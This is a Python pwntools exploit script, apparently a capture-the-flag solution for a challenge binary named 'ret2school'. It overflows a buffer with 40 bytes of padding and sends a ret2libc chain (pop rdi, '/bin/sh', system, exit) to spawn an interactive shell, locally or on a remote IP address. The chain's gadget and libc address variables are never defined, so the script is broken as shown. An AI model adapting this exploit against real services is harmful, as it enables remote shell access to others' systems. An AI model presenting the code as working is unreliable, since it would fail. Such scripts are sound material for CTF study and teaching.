#!/usr/bin/env python3

from pwn import *

binary = context.binary = ELF('./ret2school')
context.log_level = "error"

if args.REMOTE:
    p = remote('20.169.252.240', 4922)
    libc = ELF("./libc.so.6")
else:
    p = process(binary.path)
    libc = ELF("./libc.so.6")

# gdb.attach(p)

offset = 40

ret = 0x400697


pay = b""
pay += b"A"*offset
pay += p64(pop_rdi_libc) + p64(binsh_libc) + p64(system_libc) + p64(exit_libc)

print(p.recv())
p.sendline(pay)
p.interactive()